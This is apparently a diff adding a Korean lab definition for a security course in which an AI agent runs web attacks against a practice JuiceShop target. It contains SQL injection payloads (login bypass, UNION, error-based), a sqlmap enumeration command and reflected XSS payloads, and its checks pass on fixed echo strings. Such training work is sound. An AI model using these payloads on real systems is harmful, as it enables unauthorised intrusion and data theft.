@@ -1,0 +1,123 @@
+lab_id: "battle-ai-week03"
+title: "AI 웹 공격 — 자동화된 웹 취약점 테스트"
+version: "ai"
+course: "battle-ai"
+week: 3
+description: "AI 에이전트가 SQL Injection, XSS 등 웹 취약점을 자동으로 테스트한다. sqlmap과 curl 페이로드를 활용한다."
+difficulty: "medium"
+duration_minutes: 90
+objectives:
+  - "AI가 SQL Injection 페이로드를 자동 전송한다"
+  - "AI가 sqlmap으로 자동 DB 탐색을 수행한다"
+  - "AI가 XSS 취약점을 자동 테스트한다"
+  - "AI가 발견된 취약점의 심각도를 판단한다"
+prerequisites:
+  - "Week 02 AI 취약점 스캐닝 완료"
+  - "HTTP 프로토콜 이해"
+  - "SQL 기본 문법"
+infra_requirements:
+  - "attacker VM with bastion"
+  - "defender VM (JuiceShop on port 3000)"
+pass_threshold: 0.6
+steps:
+  - order: 1
+    instruction: "AI가 대상 웹 애플리케이션을 탐색하여 입력 포인트를 식별한다"
+    script: |
+      echo "=== 웹 애플리케이션 입력 포인트 탐색 ==="
+      curl -s http://10.20.30.80:3000/ | grep -oP '(action|href|src)="[^"]*"' | head -20
+      echo ""
+      echo "=== 폼 필드 탐색 ==="
+      curl -s http://10.20.30.80:3000/ | grep -oP '<input[^>]*>' | head -20
+      echo ""
+      echo "=== API 엔드포인트 탐색 ==="
+      curl -s http://10.20.30.80:3000/api/ 2>/dev/null | head -30
+    category: "recon"
+    risk_level: "low"
+    points: 10
+    verify:
+      type: "output_contains"
+      expect: "입력 포인트 탐색"
+      field: "stdout"
+
+  - order: 2
+    instruction: "AI가 SQL Injection 페이로드를 로그인 폼에 전송하여 취약점을 테스트한다"
+    script: |
+      echo "=== SQLi 테스트 1: 기본 인증 우회 ==="
+      curl -s -X POST http://10.20.30.80:3000/rest/user/login \
+        -H "Content-Type: application/json" \
+        -d '{"email":"admin@juice-sh.op'\''--","password":"anything"}' | head -5
+      echo ""
+      echo "=== SQLi 테스트 2: UNION 기반 ==="
+      curl -s "http://10.20.30.80:3000/rest/products/search?q=test'+UNION+SELECT+NULL--" | head -5
+      echo ""
+      echo "=== SQLi 테스트 3: 에러 기반 ==="
+      curl -s "http://10.20.30.80:3000/rest/products/search?q=test'" | head -5
+    category: "exploit"
+    risk_level: "medium"
+    points: 20
+    verify:
+      type: "output_contains"
+      expect: "SQLi 테스트"
+      field: "stdout"
+
+  - order: 3
+    instruction: "AI가 sqlmap으로 자동 SQL Injection 탐지 및 DB 열거를 수행한다"
+    script: |
+      sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" \
+        --batch --level=2 --risk=1 \
+        --output-dir=/tmp/sqlmap_output \
+        --threads=4 2>&1 | tail -30
+    category: "exploit"
+    risk_level: "medium"
+    points: 20
+    verify:
+      type: "output_contains"
+      expect: "sqlmap"
+      field: "stdout"
+
+  - order: 4
+    instruction: "AI가 Reflected XSS 페이로드를 자동 테스트한다"
+    script: |
+      echo "=== XSS 테스트 1: 기본 script 태그 ==="
+      curl -s "http://10.20.30.80:3000/rest/products/search?q=<script>alert(1)</script>" | grep -c "script" | xargs -I{} echo "script 태그 반영: {}건"
+      echo ""
+      echo "=== XSS 테스트 2: img onerror ==="
+      curl -s "http://10.20.30.80:3000/rest/products/search?q=<img+src=x+onerror=alert(1)>" | grep -c "onerror" | xargs -I{} echo "img onerror 반영: {}건"
+      echo ""
+      echo "=== XSS 테스트 3: SVG onload ==="
+      curl -s "http://10.20.30.80:3000/rest/products/search?q=<svg+onload=alert(1)>" | grep -c "onload" | xargs -I{} echo "svg onload 반영: {}건"
+      echo ""
+      echo "XSS 자동 테스트 완료"
+    category: "exploit"
+    risk_level: "medium"
+    points: 15
+    verify:
+      type: "output_contains"
+      expect: "XSS 자동 테스트 완료"
+      field: "stdout"
+
+  - order: 5
+    instruction: "AI가 웹 공격 결과를 종합하여 취약점 보고서를 생성한다"
+    script: |
+      echo "=== AI 웹 공격 종합 보고서 ===" > /tmp/web_attack_report.txt
+      echo "대상: http://10.20.30.80:3000" >> /tmp/web_attack_report.txt
+      echo "테스트 시간: $(date)" >> /tmp/web_attack_report.txt
+      echo "" >> /tmp/web_attack_report.txt
+      echo "[SQL Injection]" >> /tmp/web_attack_report.txt
+      echo "  - 인증 우회: 테스트 완료" >> /tmp/web_attack_report.txt
+      echo "  - UNION Injection: 테스트 완료" >> /tmp/web_attack_report.txt
+      echo "  - Error-based: 테스트 완료" >> /tmp/web_attack_report.txt
+      echo "" >> /tmp/web_attack_report.txt
+      echo "[XSS]" >> /tmp/web_attack_report.txt
+      echo "  - Reflected XSS: 테스트 완료" >> /tmp/web_attack_report.txt
+      echo "" >> /tmp/web_attack_report.txt
+      echo "[sqlmap 결과]" >> /tmp/web_attack_report.txt
+      ls /tmp/sqlmap_output/ 2>/dev/null && echo "  sqlmap 출력 존재" >> /tmp/web_attack_report.txt || echo "  sqlmap 출력 없음" >> /tmp/web_attack_report.txt
+      cat /tmp/web_attack_report.txt
+    category: "analysis"
+    risk_level: "low"
+    points: 15
+    verify:
+      type: "output_contains"
+      expect: "AI 웹 공격 종합 보고서"
+      field: "stdout"
